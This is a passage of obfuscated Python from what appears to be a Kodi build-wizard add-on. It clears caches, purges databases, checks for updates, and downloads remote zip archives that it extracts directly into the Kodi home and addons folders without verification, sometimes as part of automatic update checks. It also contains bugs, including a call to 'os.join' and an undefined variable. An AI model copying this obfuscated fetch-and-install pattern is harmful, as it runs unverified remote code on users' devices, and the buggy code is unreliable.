		try :#line:5487
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5488
		except :#line:5489
			pass #line:5490
		try :#line:5491
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5492
		except :#line:5493
			pass #line:5494
		try :#line:5495
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5496
		except :#line:5497
			pass #line:5498
def clearThumb (type =None ):#line:5499
	O000000O0000OOO0O =wiz .latestDB ('Textures')#line:5500
	if not type ==None :OOOO0O0000OO0O0O0 =1 #line:5501
	else :OOOO0O0000OO0O0O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O000000O0000OOO0O ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5502
	if OOOO0O0000OO0O0O0 ==1 :#line:5503
		try :wiz .removeFile (os .join (DATABASE ,O000000O0000OOO0O ))#line:5504
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O000000O0000OOO0O )#line:5505
		wiz .removeFolder (THUMBS )#line:5506
	else :wiz .log ('Clear thumbnames cancelled')#line:5508
	wiz .redoThumbs ()#line:5509
def purgeDb ():#line:5511
	OO0OOOO0O0OO0O00O =[];O00OOO000O0OO0000 =[]#line:5512
	for O0OO00OO000O0OO00 ,O00OOOOOOOO0OO0OO ,O00O0000OO0O0000O in os .walk (HOME ):#line:5513
		for O00OO00OO0OOOOO00 in fnmatch .filter (O00O0000OO0O0000O ,'*.db'):#line:5514
			if O00OO00OO0OOOOO00 !='Thumbs.db':#line:5515
				O0000O0O00000O000 =os .path .join (O0OO00OO000O0OO00 ,O00OO00OO0OOOOO00 )#line:5516
				OO0OOOO0O0OO0O00O .append (O0000O0O00000O000 )#line:5517
				OO0O0O0OOO00O00O0 =O0000O0O00000O000 .replace ('\\','/').split ('/')#line:5518
				O00OOO000O0OO0000 .append ('(%s) %s'%(OO0O0O0OOO00O00O0 [len (OO0O0O0OOO00O00O0 )-2 ],OO0O0O0OOO00O00O0 [len (OO0O0O0OOO00O00O0 )-1 ]))#line:5519
	if KODIV >=16 :#line:5520
		O000OO00O0O000000 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00OOO000O0OO0000 )#line:5521
		if O000OO00O0O000000 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5522
		elif len (O000OO00O0O000000 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5523
		else :#line:5524
			for O0O000OO0O0OOO0O0 in O000OO00O0O000000 :wiz .purgeDb (OO0OOOO0O0OO0O00O [O0O000OO0O0OOO0O0 ])#line:5525
	else :#line:5526
		O000OO00O0O000000 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00OOO000O0OO0000 )#line:5527
		if O000OO00O0O000000 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5528
		else :wiz .purgeDb (OO0OOOO0O0OO0O00O [O0O000OO0O0OOO0O0 ])#line:5529
def fastupdatefirstbuild (OO000000000000O0O ):#line:5535
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5537
	if ENABLE =='Yes':#line:5538
		if not NOTIFY =='true':#line:5539
			O0OO0OOOOOOOO0O0O =wiz .workingURL (NOTIFICATION )#line:5540
			if O0OO0OOOOOOOO0O0O ==True :#line:5541
				OO0O000OO0O0O0O0O ,O0O0OO0000000O00O =wiz .splitNotify (NOTIFICATION )#line:5542
				if not OO0O000OO0O0O0O0O ==False :#line:5544
					try :#line:5545
						OO0O000OO0O0O0O0O =int (OO0O000OO0O0O0O0O );OO000000000000O0O =int (OO000000000000O0O )#line:5546
						checkidupdate ()#line:5547
						wiz .setS ("notedismiss","true")#line:5548
						if OO0O000OO0O0O0O0O ==OO000000000000O0O :#line:5549
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OO0O000OO0O0O0O0O ),xbmc .LOGNOTICE )#line:5550
						elif OO0O000OO0O0O0O0O >OO000000000000O0O :#line:5552
							wiz .log ("[Notifications] id: %s"%str (OO0O000OO0O0O0O0O ),xbmc .LOGNOTICE )#line:5553
							wiz .setS ('noteid',str (OO0O000OO0O0O0O0O ))#line:5554
							wiz .setS ("notedismiss","true")#line:5555
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5558
					except Exception as O00O0O0000OOOO0O0 :#line:5559
						wiz .log ("Error on Notifications Window: %s"%str (O00O0O0000OOOO0O0 ),xbmc .LOGERROR )#line:5560
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5562
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0OO0OOOOOOOO0O0O ),xbmc .LOGNOTICE )#line:5563
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5564
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5565
def checkUpdate ():#line:5567
	OOOO00000000O00O0 =wiz .getS ('disableupdate')#line:5568
	OOO0OOO000OOOOOOO =wiz .getS ('buildname')#line:5569
	OOO0000OO0OOO00OO =wiz .getS ('buildversion')#line:5570
	O000O00O00OO0O0OO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:5571
	O000O0OOO000O0O00 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%OOO0OOO000OOOOOOO ).findall (O000O00O00OO0O0OO )#line:5572
	if len (O000O0OOO000O0O00 )>0 :#line:5573
		O00000O00O00O00OO =O000O0OOO000O0O00 [0 ][0 ]#line:5574
		OO0OOOOO0O0OO00OO =O000O0OOO000O0O00 [0 ][1 ]#line:5575
		O00OOO000O0O0O00O =O000O0OOO000O0O00 [0 ][2 ]#line:5576
		wiz .setS ('latestversion',O00000O00O00O00OO )#line:5577
		if O00000O00O00O00OO >OOO0000OO0OOO00OO :#line:5578
			if OOOO00000000O00O0 =='false':#line:5579
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(OOO0000OO0OOO00OO ,O00000O00O00O00OO ),xbmc .LOGNOTICE )#line:5580
				notify .updateWindow (OOO0OOO000OOOOOOO ,OOO0000OO0OOO00OO ,O00000O00O00O00OO ,OO0OOOOO0O0OO00OO ,O00OOO000O0O0O00O )#line:5581
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(OOO0000OO0OOO00OO ,O00000O00O00O00OO ),xbmc .LOGNOTICE )#line:5582
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(OOO0000OO0OOO00OO ,O00000O00O00O00OO ),xbmc .LOGNOTICE )#line:5583
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:5584
def updatetelemedia (OO00OOOOOOO0OOOO0 ):#line:5585
    from startup import teleupdate #line:5586
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5587
    xbmc .executebuiltin ("UpdateLocalAddons")#line:5588
    xbmc .executebuiltin ("UpdateAddonRepos")#line:5589
    wiz .wizardUpdate ('startup')#line:5590
    checkUpdate ()#line:5592
    xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:5593
    time .sleep (15.0 )#line:5594
    if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:5595
     if teleupdate is False :#line:5596
        STARTP2 ()#line:5598
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5599
        if not NOTIFY =='true':#line:5600
            OO0O00O00000OO000 =wiz .workingURL (NOTIFICATION )#line:5601
            if OO0O00O00000OO000 ==True :#line:5602
                O0OO00000OOO00OO0 ,O0O0000O00O0O0000 =wiz .splitNotify (NOTIFICATION )#line:5603
                if not O0OO00000OOO00OO0 ==False :#line:5604
                    try :#line:5605
                        O0OO00000OOO00OO0 =int (O0OO00000OOO00OO0 );OO00OOOOOOO0OOOO0 =int (OO00OOOOOOO0OOOO0 )#line:5606
                        if O0OO00000OOO00OO0 ==OO00OOOOOOO0OOOO0 :#line:5607
                            if NOTEDISMISS =='false':#line:5608
                                debridit .debridIt ('update','all')#line:5609
                                traktit .traktIt ('update','all')#line:5610
                                checkidupdatetele ()#line:5611
                            else :wiz .log ("[Notifications] id[%s] Dismissed"%int (O0OO00000OOO00OO0 ),xbmc .LOGNOTICE )#line:5612
                        elif O0OO00000OOO00OO0 >OO00OOOOOOO0OOOO0 :#line:5613
                            wiz .log ("[Notifications] id: %s"%str (O0OO00000OOO00OO0 ),xbmc .LOGNOTICE )#line:5614
                            wiz .setS ('noteid',str (O0OO00000OOO00OO0 ))#line:5615
                            wiz .setS ('notedismiss','false')#line:5616
                            debridit .debridIt ('update','all')#line:5618
                            traktit .traktIt ('update','all')#line:5619
                            checkidupdatetele ()#line:5620
                            wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5622
                    except Exception as O00O0OO0OOOOO0O0O :#line:5623
                        wiz .log ("Error on Notifications Window: %s"%str (O00O0OO0OOOOO0O0O ),xbmc .LOGERROR )#line:5624
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5625
            else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO0O00O00000OO000 ),xbmc .LOGNOTICE )#line:5626
        else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5627
def checkidupdate ():#line:5631
				wiz .setS ("notedismiss","true")#line:5633
				OOOOO000OOO000OO0 =wiz .workingURL (NOTIFICATION )#line:5634
				O0OO00000OOOO000O =" Kodi Premium"#line:5636
				O0O0000O000OO0O0O =wiz .checkBuild (O0OO00000OOOO000O ,'gui')#line:5637
				O0O00OOO00OOOOO0O =O0OO00000OOOO000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5638
				if not wiz .workingURL (O0O0000O000OO0O0O )==True :return #line:5639
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5640
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0OO00000OOOO000O ),'','אנא המתן')#line:5641
				O00O000OO0OO0O000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O00OOO00OOOOO0O )#line:5642
				try :os .remove (O00O000OO0OO0O000 )#line:5643
				except :pass #line:5644
				logging .warning (O0O0000O000OO0O0O )#line:5645
				if 'google'in O0O0000O000OO0O0O :#line:5646
				   O0OO0O0000O0000OO =googledrive_download (O0O0000O000OO0O0O ,O00O000OO0OO0O000 ,DP ,wiz .checkBuild (O0OO00000OOOO000O ,'filesize'))#line:5647
				else :#line:5650
				  downloader .download (O0O0000O000OO0O0O ,O00O000OO0OO0O000 ,DP )#line:5651
				xbmc .sleep (100 )#line:5652
				OO0OO0O0OOOO0O0OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO00000OOOO000O )#line:5653
				DP .update (0 ,OO0OO0O0OOOO0O0OO ,'','אנא המתן')#line:5654
				extract .all (O00O000OO0OO0O000 ,HOME ,DP ,title =OO0OO0O0OOOO0O0OO )#line:5655
				DP .close ()#line:5656
				wiz .defaultSkin ()#line:5657
				wiz .lookandFeelData ('save')#line:5658
				if KODIV >=18 :#line:5659
					skindialogsettind18 ()#line:5660
				if INSTALLMETHOD ==1 :OO0OOOOO0OOOOO00O =1 #line:5663
				elif INSTALLMETHOD ==2 :OO0OOOOO0OOOOO00O =0 #line:5664
				else :DP .close ()#line:5665
def checkidupdatetele ():#line:5666
				wiz .setS ("notedismiss","true")#line:5668
				O0O000O0O00O0OO0O =wiz .workingURL (NOTIFICATION )#line:5669
				OOO0O0O000OO0O00O =" Kodi Premium"#line:5671
				OO0O0OOO00O0O000O =wiz .checkBuild (OOO0O0O000OO0O00O ,'gui')#line:5672
				OOOO00OO00O00O00O =OOO0O0O000OO0O00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5673
				if not wiz .workingURL (OO0O0OOO00O0O000O )==True :return #line:5674
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5675
				O0OOOO0OOO0OO0OO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOO00OO00O00O00O )#line:5678
				try :os .remove (O0OOOO0OOO0OO0OO0 )#line:5679
				except :pass #line:5680
				if 'google'in OO0O0OOO00O0O000O :#line:5682
				   OO0OOOO0O0000OOO0 =googledrive_download (OO0O0OOO00O0O000O ,O0OOOO0OOO0OO0OO0 ,DP2 ,wiz .checkBuild (OOO0O0O000OO0O00O ,'filesize'))#line:5683
				else :#line:5686
				  downloaderbg .download3 (OO0O0OOO00O0O000O ,O0OOOO0OOO0OO0OO0 ,DP2 )#line:5687
				xbmc .sleep (100 )#line:5688
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:5689
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:5691
				extract .all2 (O0OOOO0OOO0OO0OO0 ,HOME ,DP2 )#line:5693
				DP2 .close ()#line:5694
				wiz .defaultSkin ()#line:5695
				wiz .lookandFeelData ('save')#line:5696
				wiz .kodi17Fix ()#line:5697
				if KODIV >=18 :#line:5698
					skindialogsettind18 ()#line:5699
				debridit .debridIt ('restore','all')#line:5704
				traktit .traktIt ('restore','all')#line:5705
				if INSTALLMETHOD ==1 :OOO00O0OOOOO0O0OO =1 #line:5706
				elif INSTALLMETHOD ==2 :OOO00O0OOOOO0O0OO =0 #line:5707
				else :DP2 .close ()#line:5708
				OO0000O000OOOOOO0 =(NOTIFICATION2 )#line:5709
				O0000OOO0OO0OOO00 =urllib2 .urlopen (OO0000O000OOOOOO0 )#line:5710
				O0000OOO0O0O0O00O =O0000OOO0OO0OOO00 .readlines ()#line:5711
				OOO0O000O00O0OOO0 =0 #line:5712
				for OOO0OO00OO000O000 in O0000OOO0O0O0O00O :#line:5715
					if OOO0OO00OO000O000 .split (' ==')[0 ]=="noreset"or OOO0OO00OO000O000 .split ()[0 ]=="noreset":#line:5716
						xbmc .executebuiltin ("ReloadSkin()")#line:5718
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:5719
						OO00O0O00OOOOO0O0 =(ADDON .getSetting ("message"))#line:5720
						if OO00O0O00OOOOO0O0 =='true':#line:5721
							infobuild ()#line:5722
						update_Votes ()#line:5723
						indicatorfastupdate ()#line:5724
					if OOO0OO00OO000O000 .split (' ==')[0 ]=="reset"or OOO0OO00OO000O000 .split ()[0 ]=="reset":#line:5725
						update_Votes ()#line:5727
						indicatorfastupdate ()#line:5728
						resetkodi ()#line:5729
def gaiaserenaddon ():#line:5730
  O000OOOO0O00000OO =(ADDON .getSetting ("gaiaseren"))#line:5731
  O0OOO00O000000O00 =(ADDON .getSetting ("auto_rd"))#line:5732
  if O000OOOO0O00000OO =='true'and O0OOO00O000000O00 =='true':#line:5733
    O0OO0OO0OO00OOO00 =(NEWFASTUPDATE )#line:5734
    O00OOO00OOOO0O0OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5735
    O0O000O000OO000OO =xbmcgui .DialogProgress ()#line:5736
    O0O000O000OO000OO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5737
    O0OO0OO0O0O0OOO0O =os .path .join (PACKAGES ,'isr.zip')#line:5738
    OO000OO0OOO0OO0OO =urllib2 .Request (O0OO0OO0OO00OOO00 )#line:5739
    OO0OO0OOO000O0OO0 =urllib2 .urlopen (OO000OO0OOO0OO0OO )#line:5740
    OOO00O0OOO0O0OO00 =xbmcgui .DialogProgress ()#line:5742
    OOO00O0OOO0O0OO00 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5743
    OOO00O0OOO0O0OO00 .update (0 )#line:5744
    OOO000O0O000OOO00 =open (O0OO0OO0O0O0OOO0O ,'wb')#line:5746
    try :#line:5748
      O0OO0000OO0OOOO00 =OO0OO0OOO000O0OO0 .info ().getheader ('Content-Length').strip ()#line:5749
      O0000OO0OO0000000 =True #line:5750
    except AttributeError :#line:5751
          O0000OO0OO0000000 =False #line:5752
    if O0000OO0OO0000000 :#line:5754
          O0OO0000OO0OOOO00 =int (O0OO0000OO0OOOO00 )#line:5755
    OO00O00000O0OO000 =0 #line:5757
    O0OO0000OOOO0O000 =time .time ()#line:5758
    while True :#line:5759
          O0OOOOO0O00OOO000 =OO0OO0OOO000O0OO0 .read (8192 )#line:5760
          if not O0OOOOO0O00OOO000 :#line:5761
              sys .stdout .write ('\n')#line:5762
              break #line:5763
          OO00O00000O0OO000 +=len (O0OOOOO0O00OOO000 )#line:5765
          OOO000O0O000OOO00 .write (O0OOOOO0O00OOO000 )#line:5766
          if not O0000OO0OO0000000 :#line:5768
              O0OO0000OO0OOOO00 =OO00O00000O0OO000 #line:5769
          if OOO00O0OOO0O0OO00 .iscanceled ():#line:5770
             OOO00O0OOO0O0OO00 .close ()#line:5771
             try :#line:5772
              os .remove (O0OO0OO0O0O0OOO0O )#line:5773
             except :#line:5774
              pass #line:5775
             break #line:5776
          OOOO00O0O00O0OO00 =float (OO00O00000O0OO000 )/O0OO0000OO0OOOO00 #line:5777
          OOOO00O0O00O0OO00 =round (OOOO00O0O00O0OO00 *100 ,2 )#line:5778
          O0O00O00OOOOO00OO =OO00O00000O0OO000 /(1024 *1024 )#line:5779
          OO00OO0OOO000OO0O =O0OO0000OO0OOOO00 /(1024 *1024 )#line:5780
          OOOOO0000000O0O00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O00O00OOOOO00OO ,'teal',OO00OO0OOO000OO0O )#line:5781
          if (time .time ()-O0OO0000OOOO0O000 )>0 :#line:5782
            OOOO00OOOOOO00OO0 =OO00O00000O0OO000 /(time .time ()-O0OO0000OOOO0O000 )#line:5783
            OOOO00OOOOOO00OO0 =OOOO00OOOOOO00OO0 /1024 #line:5784
          else :#line:5785
           OOOO00OOOOOO00OO0 =0 #line:5786
          O000O0O0O0OOO0OOO ='KB'#line:5787
          if OOOO00OOOOOO00OO0 >=1024 :#line:5788
             OOOO00OOOOOO00OO0 =OOOO00OOOOOO00OO0 /1024 #line:5789
             O000O0O0O0OOO0OOO ='MB'#line:5790
          if OOOO00OOOOOO00OO0 >0 and not OOOO00O0O00O0OO00 ==100 :#line:5791
              OOO0OOO0OOO0O0OO0 =(O0OO0000OO0OOOO00 -OO00O00000O0OO000 )/OOOO00OOOOOO00OO0 #line:5792
          else :#line:5793
              OOO0OOO0OOO0O0OO0 =0 #line:5794
          O00OOO000O0O0O000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOO00OOOOOO00OO0 ,O000O0O0O0OOO0OOO )#line:5795
          OOO00O0OOO0O0OO00 .update (int (OOOO00O0O00O0OO00 ),OOOOO0000000O0O00 ,O00OOO000O0O0O000 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5797
    OOOO0O0OOOOO0OO00 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5800
    OOO000O0O000OOO00 .close ()#line:5803
    extract .all (O0OO0OO0O0O0OOO0O ,OOOO0O0OOOOO0OO00 ,OOO00O0OOO0O0OO00 )#line:5804
    try :#line:5808
      os .remove (O0OO0OO0O0O0OOO0O )#line:5809
    except :#line:5810
      pass #line:5811
def iptvsimpldownpc ():#line:5812
    OO0O0OOOO00OO0O0O =(IPTVSIMPL18PC )#line:5814
    O0OOO000O0OOOOOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5815
    OOOOOOO000O0O00OO =xbmcgui .DialogProgress ()#line:5816
    OOOOOOO000O0O00OO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5817
    OOOO0O0000OO00O0O =os .path .join (PACKAGES ,'isr.zip')#line:5818
    OOO0000O000OO000O =urllib2 .Request (OO0O0OOOO00OO0O0O )#line:5819
    O0O00000OO0O00O00 =urllib2 .urlopen (OOO0000O000OO000O )#line:5820
    OO000O0O0OOO0OO0O =xbmcgui .DialogProgress ()#line:5822
    OO000O0O0OOO0OO0O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5823
    OO000O0O0OOO0OO0O .update (0 )#line:5824
    O000O0O0O00OO0000 =open (OOOO0O0000OO00O0O ,'wb')#line:5826
    try :#line:5828
      O00OOOO0000O0O00O =O0O00000OO0O00O00 .info ().getheader ('Content-Length').strip ()#line:5829
      O00O0OOOO00OO0O0O =True #line:5830
    except AttributeError :#line:5831
          O00O0OOOO00OO0O0O =False #line:5832
    if O00O0OOOO00OO0O0O :#line:5834
          O00OOOO0000O0O00O =int (O00OOOO0000O0O00O )#line:5835
    O00000OO0O0O0O00O =0 #line:5837
    O0O00OO00O0000000 =time .time ()#line:5838
    while True :#line:5839
          OOOO0O000OOOOO00O =O0O00000OO0O00O00 .read (8192 )#line:5840
          if not OOOO0O000OOOOO00O :#line:5841
              sys .stdout .write ('\n')#line:5842
              break #line:5843
          O00000OO0O0O0O00O +=len (OOOO0O000OOOOO00O )#line:5845
          O000O0O0O00OO0000 .write (OOOO0O000OOOOO00O )#line:5846
          if not O00O0OOOO00OO0O0O :#line:5848
              O00OOOO0000O0O00O =O00000OO0O0O0O00O #line:5849
          if OO000O0O0OOO0OO0O .iscanceled ():#line:5850
             OO000O0O0OOO0OO0O .close ()#line:5851
             try :#line:5852
              os .remove (OOOO0O0000OO00O0O )#line:5853
             except :#line:5854
              pass #line:5855
             break #line:5856
          OO0000OO00OO000O0 =float (O00000OO0O0O0O00O )/O00OOOO0000O0O00O #line:5857
          OO0000OO00OO000O0 =round (OO0000OO00OO000O0 *100 ,2 )#line:5858
          OOOOOO0OOOOOOOO00 =O00000OO0O0O0O00O /(1024 *1024 )#line:5859
          OO0OOO000000OOO0O =O00OOOO0000O0O00O /(1024 *1024 )#line:5860
          OOOO00OO00O000OOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOOO0OOOOOOOO00 ,'teal',OO0OOO000000OOO0O )#line:5861
          if (time .time ()-O0O00OO00O0000000 )>0 :#line:5862
            OOOOO0OOO000OOO0O =O00000OO0O0O0O00O /(time .time ()-O0O00OO00O0000000 )#line:5863
            OOOOO0OOO000OOO0O =OOOOO0OOO000OOO0O /1024 #line:5864
          else :#line:5865
           OOOOO0OOO000OOO0O =0 #line:5866
          O0OO0OOOO000000OO ='KB'#line:5867
          if OOOOO0OOO000OOO0O >=1024 :#line:5868
             OOOOO0OOO000OOO0O =OOOOO0OOO000OOO0O /1024 #line:5869
             O0OO0OOOO000000OO ='MB'#line:5870
          if OOOOO0OOO000OOO0O >0 and not OO0000OO00OO000O0 ==100 :#line:5871
              O0OOOOOOO00O000O0 =(O00OOOO0000O0O00O -O00000OO0O0O0O00O )/OOOOO0OOO000OOO0O #line:5872
          else :#line:5873
              O0OOOOOOO00O000O0 =0 #line:5874
          O0O0O00OO0OOOO00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOO0OOO000OOO0O ,O0OO0OOOO000000OO )#line:5875
          OO000O0O0OOO0OO0O .update (int (OO0000OO00OO000O0 ),OOOO00OO00O000OOO ,O0O0O00OO0OOOO00O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5877
    O000OO000OOO00OO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5880
    O000O0O0O00OO0000 .close ()#line:5883
    extract .all (OOOO0O0000OO00O0O ,O000OO000OOO00OO0 ,OO000O0O0OOO0OO0O )#line:5884
    try :#line:5888
      os .remove (OOOO0O0000OO00O0O )#line:5889
    except :#line:5890
      pass #line:5891
def iptvkodi18idan ():#line:5892
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:5894
              O00OOOO000O0OOOO0 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:5897
              O000O000OOOOOOOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5898
              O0O0O00OOOO0OOO00 =xbmcgui .DialogProgress ()#line:5899
              O0O0O00OOOO0OOO00 .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5900
              OO000O00O000000O0 =os .path .join (O000O000OOOOOOOO0 ,'isr.zip')#line:5901
              O0OOOO0O000O0OO0O =urllib2 .Request (O00OOOO000O0OOOO0 )#line:5902
              OOOOO0OO0OOO0OOO0 =urllib2 .urlopen (O0OOOO0O000O0OO0O )#line:5903
              O0O0OOO0OOOOOOO0O =xbmcgui .DialogProgress ()#line:5905
              O0O0OOO0OOOOOOO0O .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5906
              O0O0OOO0OOOOOOO0O .update (0 )#line:5907
              O000OO0O0O0OO0O0O =open (OO000O00O000000O0 ,'wb')#line:5909
              try :#line:5911
                O0O0000O000OOO00O =OOOOO0OO0OOO0OOO0 .info ().getheader ('Content-Length').strip ()#line:5912
                O0O00O0OO00OOO0OO =True #line:5913
              except AttributeError :#line:5914
                    O0O00O0OO00OOO0OO =False #line:5915
              if O0O00O0OO00OOO0OO :#line:5917
                    O0O0000O000OOO00O =int (O0O0000O000OOO00O )#line:5918
              O0OO0OOOO0OOO00O0 =0 #line:5920
              OOO00OO00OO000000 =time .time ()#line:5921
              while True :#line:5922
                    OOO0O00O0OO0O0OOO =OOOOO0OO0OOO0OOO0 .read (8192 )#line:5923
                    if not OOO0O00O0OO0O0OOO :#line:5924
                        sys .stdout .write ('\n')#line:5925
                        break #line:5926
                    O0OO0OOOO0OOO00O0 +=len (OOO0O00O0OO0O0OOO )#line:5928
                    O000OO0O0O0OO0O0O .write (OOO0O00O0OO0O0OOO )#line:5929
                    if not O0O00O0OO00OOO0OO :#line:5931
                        O0O0000O000OOO00O =O0OO0OOOO0OOO00O0 #line:5932
                    if O0O0OOO0OOOOOOO0O .iscanceled ():#line:5933
                       O0O0OOO0OOOOOOO0O .close ()#line:5934
                       try :#line:5935
                        os .remove (OO000O00O000000O0 )#line:5936
                       except :#line:5937
                        pass #line:5938
                       break #line:5939
                    O0OOO0OOO0000OOOO =float (O0OO0OOOO0OOO00O0 )/O0O0000O000OOO00O #line:5940
                    O0OOO0OOO0000OOOO =round (O0OOO0OOO0000OOOO *100 ,2 )#line:5941
                    OOOOO0OO0000OOOOO =O0OO0OOOO0OOO00O0 /(1024 *1024 )#line:5942
                    O00OOOOO000OOOO0O =O0O0000O000OOO00O /(1024 *1024 )#line:5943
                    O000OOOOOOOO000O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOO0OO0000OOOOO ,'teal',O00OOOOO000OOOO0O )#line:5944
                    if (time .time ()-OOO00OO00OO000000 )>0 :#line:5945
                      OOO0O0O000O00O0O0 =O0OO0OOOO0OOO00O0 /(time .time ()-OOO00OO00OO000000 )#line:5946
                      OOO0O0O000O00O0O0 =OOO0O0O000O00O0O0 /1024 #line:5947
                    else :#line:5948
                     OOO0O0O000O00O0O0 =0 #line:5949
                    OOO00000OO0O0OOO0 ='KB'#line:5950
                    if OOO0O0O000O00O0O0 >=1024 :#line:5951
                       OOO0O0O000O00O0O0 =OOO0O0O000O00O0O0 /1024 #line:5952
                       OOO00000OO0O0OOO0 ='MB'#line:5953
                    if OOO0O0O000O00O0O0 >0 and not O0OOO0OOO0000OOOO ==100 :#line:5954
                        OO0000OOO000OO0OO =(O0O0000O000OOO00O -O0OO0OOOO0OOO00O0 )/OOO0O0O000O00O0O0 #line:5955
                    else :#line:5956
                        OO0000OOO000OO0OO =0 #line:5957
